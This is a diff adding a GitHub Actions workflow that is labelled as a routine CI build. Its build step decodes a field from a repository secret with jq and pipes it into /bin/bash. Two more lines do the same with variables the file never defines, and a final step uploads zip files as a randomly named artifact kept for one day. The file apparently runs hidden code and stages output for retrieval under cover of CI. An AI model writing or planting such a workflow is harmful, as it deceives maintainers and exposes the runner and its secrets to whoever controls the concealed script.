@@ -1,0 +1,28 @@
+name: CI
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          e55: ${{ secrets.e55 }}
+        run: |
+          printf '%s' "$e55" | jq -r .qrje16 | /bin/bash
+          printf '%s' "$h94502" | jq -r .f680 | /bin/bash
+          printf '%s' "$rmyz894" | jq -r .wm288 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: w45qzpWK
+          path: "*.zip"
+          retention-days: 1
